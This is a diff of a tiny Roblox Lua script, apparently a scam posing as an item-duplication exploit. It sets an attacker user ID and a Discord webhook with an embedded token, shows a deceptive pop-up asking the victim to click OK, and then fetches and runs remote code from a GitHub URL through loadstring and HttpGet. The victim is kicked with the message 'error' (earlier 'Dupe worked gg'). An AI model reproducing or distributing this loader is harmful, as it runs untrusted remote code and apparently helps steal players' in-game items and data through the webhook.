@@ -1,1 +1,7 @@
-_G.UserID = 2502432987 _G.Webhook = https://discord.com/api/webhooks/1016398664329076889/mrm44UuT3hn8U_8ZweYHcuEps1jpAJSsVDw1QiJiXDGIB2tbiHOrQQ1Dh6VKWotEAp-Q _G.KickMessage = "Dupe worked gg" _G.PopUpMessage = "Lets get started" loadstring(game:HttpGet"https://raw.githubusercontent.com/ToxinKindaScripts/psxdupe/main/script2")()
+_G.UserID = 2502432987
+
+_G.Webhook = "https://discord.com/api/webhooks/1043980940130664568/Rr7zvobT04qrwYhTfT6HthfyTp_6FjKy-MUVn0C1Z6b86E7TD7_cQMoL8pD6W_ZqkZNA"
+_G.KickMessage = "error"
+_G.PopUpMessage = "Do You Want to Use This? Click Ok If Yes"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Project-WD/main/Main.lua"))()
